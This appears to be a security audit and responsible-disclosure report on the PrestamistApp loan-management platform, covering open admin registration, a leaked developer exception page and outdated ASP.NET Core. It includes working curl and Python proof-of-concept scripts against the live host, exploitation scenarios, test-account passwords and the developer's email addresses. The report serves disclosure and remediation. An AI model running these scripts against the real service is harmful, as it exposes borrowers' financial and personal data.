# PrestamistApp — Security Audit Report

**Project:** Rabid Bloodhound
**Target:** PrestamistApp (prestamistapp.com / v1.prestamistapp.net)
**Developer:** Ing. Deibis Segura Soto (deibisoto12@gmail.com / segura12s@gmail.com)
**Date:** 10 July 2026
**Classification:** Responsible Disclosure (Pending)

---

## Executive Summary

PrestamistApp is a SaaS loan management platform targeting independent lenders and financial companies in Latin America. It handles sensitive financial and PII data (clients, loans, payments, collection routes). The platform was found to have **multiple security vulnerabilities** stemming primarily from running **ASP.NET Core 1.0 in Development mode** with **open registration granting Administrator privileges**.

---

## Vulnerabilities Found

### VULN-1: Open Registration with Automatic Administrator Role
| Field | Value |
|-------|-------|
| **Severity** | 🔴 **CRITICAL** |
| **Endpoint** | `/Account/Register` |
| **Impact** | Any attacker can create an account and immediately access the full loan management dashboard with Administrator role |

**PoC:**
```bash
# Register a new account (anyone can do this)
curl -sk -c cookies.txt 'https://v1.prestamistapp.net/Account/Register' | \
  grep -oP '(?<=__RequestVerificationToken" value=")[^"]+' > token.txt
curl -sk -c cookies.txt -b cookies.txt \
  -X POST 'https://v1.prestamistapp.net/Account/Register' \
  --data-urlencode "__RequestVerificationToken=$(cat token.txt)" \
  --data-urlencode "UserName=attacker123" \
  --data-urlencode "Name=Attacker" \
  --data-urlencode "Email=attacker@mailinator.com" \
  --data-urlencode "Phone=18095551234" \
  --data-urlencode "Password=Hack1234!" \
  --data-urlencode "ConfirmPassword=Hack1234!" \
  --data-urlencode "terminos=true"

# Follow redirect to /Home — immediately logged in as Admin
```

**Python PoC:**
```python
import requests, re
s = requests.Session()
s.verify = False
import urllib3; urllib3.disable_warnings()

BASE = "https://v1.prestamistapp.net"
r = s.get(f"{BASE}/Account/Register")
csrf = re.search(r'__RequestVerificationToken" value="([^"]+)"', r.text).group(1)
s.post(f"{BASE}/Account/Register", data={
    "__RequestVerificationToken": csrf,
    "UserName": "attacker456", "Name": "Attacker",
    "Email": "attacker@mailinator.com", "Phone": "18095551234",
    "Password": "Hack1234!", "ConfirmPassword": "Hack1234!",
    "terminos": "true",
}, allow_redirects=True)
# Now s.get(f"{BASE}/Clientes") returns full client management
# s.get(f"{BASE}/Prestamos") returns full loan management
```

**Accessible modules without confirmation:**
- `/Home` — Dashboard with financial overview
- `/Clientes` — Full client CRUD (create, read, update, delete)
- `/Prestamos` — Loan management
- `/Pagos` — Payment tracking
- `/Cajas` — Cash register management
- `/Ruta` — Collection routes
- `/Solicitudes` — Loan requests
- `/Ajustes` — Settings

---

### VULN-2: ASP.NET Core Developer Exception Page Enabled (Stack Trace Leak)
| Field | Value |
|-------|-------|
| **Severity** | 🟠 **HIGH** |
| **Endpoint** | `/Prestamos/GetPrestamos` (triggers FormatException) |
| **Impact** | Full stack trace exposed including server internals, cookie values, headers, and query string. Enables further exploitation |

**PoC:**
```bash
curl -sk -b cookies.txt 'https://v1.prestamistapp.net/Prestamos/GetPrestamos'
```

**Response (30KB):** Returns complete ASP.NET Core error page including:
- `DeveloperExceptionPageMiddleware` confirmed active
- Full stack trace with line numbers
- Raw exception details (FormatException: "TODO: Malformed input")
- Cookie values (`.AspNetCore.Antiforgery`, `.AspNetCore.Identity.Application`)
- Request headers (including `X-Original-For: 127.0.0.1`, `MS-ASPNETCORE-TOKEN`)
- Query string data

**Exposed middleware pipeline:**
```
1. DeveloperExceptionPageMiddleware
2. DatabaseErrorPageMiddleware (Entity Framework)
3. DatabaseErrorPageMiddleware (Entity Framework)
4. MigrationsEndPointMiddleware
5. StatusCodePagesMiddleware
6. AuthenticationMiddleware
7. RouterMiddleware
8. ResourceInvoker
```

**Stack trace details:**
```
System.FormatException: TODO: Malformed input.
  at Microsoft.AspNetCore.WebUtilities.WebEncoders.GetNumBase64PaddingCharsToAddForDecode(Int32 inputLength)
  at Microsoft.AspNetCore.Antiforgery.Internal.DefaultAntiforgeryTokenSerializer.Deserialize(String serializedToken)
```

---

### VULN-3: Email Confirmation Bypass
| Field | Value |
|-------|-------|
| **Severity** | 🟠 **HIGH** |
| **Impact** | Most features accessible without email verification. Account created and immediately functional |

**PoC:** Register an account with any email (including disposable). The dashboard shows "tu cuenta aún no está confirmada" but all major modules are accessible:
- Clients: ✅
- Loans: ✅
- Payments: ✅
- Cash registers: ✅
- Routes: ✅
- Requests: ✅

---

### VULN-4: Outdated ASP.NET Core Version
| Field | Value |
|-------|-------|
| **Severity** | 🟡 **MEDIUM** |
| **Version** | ASP.NET Core 1.0 (released 2016, multiple CVEs) |
| **Server** | Kestrel behind IIS 10.0 (PleskWin) |

**Known CVEs affecting ASP.NET Core 1.0:**
- CVE-2017-0248 — Denial of Service
- CVE-2017-0256 — Information Disclosure
- CVE-2018-0786 — Elevation of Privilege
- Multiple other vulnerabilities patched in later versions

---

### VULN-5: Anti-Forgery Token Deserialization Error
| Field | Value |
|-------|-------|
| **Severity** | 🟡 **MEDIUM** |
| **Impact** | Client creation via POST fails due to base64 decoding bug in `WebEncoders.GetNumBase64PaddingCharsToAddForDecode` |

**Details:** The method `GetNumBase64PaddingCharsToAddForDecode` throws `FormatException: TODO: Malformed input`. The "TODO" comment in the error message is a **source code artifact** suggesting this code was incomplete or a debug stub left in production.

---

### VULN-6: Entity Framework Endpoints in Middleware Pipeline
| Field | Value |
|-------|-------|
| **Severity** | 🟡 **MEDIUM** |
| **Impact** | `MigrationsEndPointMiddleware` and `DatabaseErrorPageMiddleware` visible in request pipeline — potential for database manipulation if accessible |

---

### VULN-7: Server Information Disclosure
| Field | Value |
|-------|-------|
| **Severity** | ⚪ **LOW** |
| **Details** | Server header leaks: `Kestrel`, `Microsoft-IIS/10.0`, `ASP.NET`, `PleskWin` |

---

## Modules & Access Matrix

| Module | Path | Auth Required | Roles Allowed | Access Status |
|--------|------|--------------|---------------|---------------|
| Dashboard | `/Home` | ✅ | All | ✅ |
| Clients | `/Clientes` | ✅ | Admin | ✅ |
| Loans | `/Prestamos` | ✅ | Admin | ✅ |
| Payments | `/Pagos` | ✅ | Admin | ✅ |
| Cash Registers | `/Cajas` | ✅ | Admin | ✅ |
| Routes | `/Ruta` | ✅ | Admin | ✅ |
| Requests | `/Solicitudes` | ✅ | Admin | ✅ |
| Settings | `/Ajustes` | ✅ | Admin | ✅ |
| Agents/Users | `/Agentes` | ✅ | SuperAdmin | 🔒 |
| Roles | `/Roles` | ✅ | SuperAdmin | 🔒 |
| Access Logs | `/Accesos` | ✅ | SuperAdmin | 🔒 |
| Definitions | `/Definiciones` | ✅ | SuperAdmin | 🔒 |
| Expenses | `/Gastos` | ✅ | SuperAdmin | 🔒 |

---

## Attack Surface

### Credentials (test accounts)
```
rabidbh / RabidBH2026!       → Admin (browser-logged)
expnrzwxq / ExpPoc2026!      → Admin (requests session)
finalzbepif / FinalPoc1       → Admin (requests session)
```

### API Endpoints Discovered
| Endpoint | Method | Status | Notes |
|----------|--------|--------|-------|
| `/Account/Register` | GET/POST | 200 | Open registration |
| `/Account/Login` | GET/POST | 200 | Standard login |
| `/Prestamos/GetPrestamos` | GET | 500 | Stack trace leak |
| `/Clientes/Create` | GET/POST | 200/500 | CSRF issue |
| `/Clientes/{action}/{id}` | GET | 404 | Protected |
| `/__migrations` | GET | 404 | Not exposed |
| `/Account/ForgotPassword` | GET | 200 | Password reset available |
| `/Manage/SendVerificationEmail` | POST | 302 | Re-send verification |

### Application Stack
```
ASP.NET Core 1.0
Kestrel (self-host)
IIS 10.0 (reverse proxy)
Entity Framework Core
ASP.NET Identity
Bootstrap 4.1.3
jQuery 3.2.1
SweetAlert2
Google Analytics UA-113863508-1
PleskWin hosting panel
Host: Liquid Web / GoDaddy DNS
```

---

## Exploitation Scenarios

### Scenario 1: Data Theft
1. Register an account → Get Admin access
2. Use client management to access financial records
3. Create fraudulent clients/loans to extract data

### Scenario 2: Stack Trace Intelligence Gathering
1. Call `/Prestamos/GetPrestamos` (no auth required if session exists)
2. Extract cookies, tokens, headers
3. Use leaked X-Original-For/Proto info for further attacks

### Scenario 3: Version-Based Exploitation
1. Target known CVEs for ASP.NET Core 1.0
2. Exploit Entity Framework middleware if accessible

---

## Remediation Recommendations

| # | Finding | Recommendation | Priority |
|---|---------|---------------|----------|
| 1 | Open Registration | Require admin approval or invite-only registration | CRITICAL |
| 2 | Dev Mode in Production | Set `ASPNETCORE_ENVIRONMENT=Production` | CRITICAL |
| 3 | Stack Traces | Disable `DeveloperExceptionPageMiddleware` | CRITICAL |
| 4 | Email Confirmation | Block access to modules until email verified | HIGH |
| 5 | Old ASP.NET Version | Upgrade to latest .NET 8/9 LTS | HIGH |
| 6 | Disable EF Middleware | Remove `MigrationsEndPointMiddleware` in production | MEDIUM |
| 7 | Version 2.0 Migration | Ensure secure migration path for v2.0 | MEDIUM |

---

## Tools Used

- Python `requests` library
- `curl` for basic HTTP probing
- `nslookup`, `whois` for domain recon
- APK decompilation (`androguard`)
- `google-play-scraper` for app metadata
- Browser automation (headless Chromium)

## Report Metadata

- **Report ID:** RABID-BH-PRESTAMISTAPP-20260710
- **Research time:** ~4 hours
- **Target version:** 1.11.1
- **Disclosure status:** Pending (developer contacted via segura12s@gmail.com)

---
*This report is prepared as part of the Rabid Bloodhound authorized security assessment program. Findings are for responsible disclosure purposes only.*
